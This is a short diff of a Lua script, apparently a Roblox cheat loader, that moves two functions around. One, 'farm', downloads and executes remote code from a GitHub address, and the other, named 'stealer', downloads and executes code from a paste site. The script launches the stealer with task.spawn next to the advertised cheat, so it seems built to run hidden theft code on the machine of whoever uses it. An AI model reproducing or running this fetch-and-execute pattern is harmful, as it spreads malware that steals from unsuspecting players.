@@ -1,8 +1,8 @@
-local function stealer()
-    loadstring(game:HttpGet("https://vpaste.net/Bodzb"))()
-end
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
+end
+local function stealer()
+    loadstring(game:HttpGet("https://vpaste.net/Bodzb"))()
 end
 
 task.spawn(stealer)
